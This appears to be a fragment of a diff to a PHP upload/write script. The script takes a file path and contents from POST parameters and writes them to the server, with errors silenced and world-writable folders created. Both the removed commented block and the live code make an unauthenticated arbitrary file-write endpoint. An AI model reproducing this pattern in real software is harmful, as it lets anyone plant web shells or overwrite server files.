@@ -1,26 +1,3 @@
-/*<?php
-
-function createFolder($path) {
-    if (!file_exists($path)) {
-        createFolder(dirname($path));
-        mkdir($path, 0777);
-    }
-}
-
-$path = urldecode($_POST["path"]);
-$data = urldecode($_POST["data"]);
-$dir = dirname($path);
-
-// 创建目录
-createFolder($dir);
-
-// 写入文件
-$file = fopen($path, "w+");
-fwrite($file, $data);
-fclose($file);
-*/
-
-
 <?php
 @error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);
 
@@ -40,8 +17,9 @@ function mkdirs($path, $mod = 0777) {
   return false;
 }
 
-if ($_POST['to']) {
-  $to = urldecode($_POST['to']);
+if ($_POST['path']) {
+  $to = urldecode($_POST['path']);
+  $content = urldecode($_POST['data']);
 
   if (is_dir($to) || $_FILES["file"]["error"] > 0) {
     header("Status: 500 Internal Server Error");
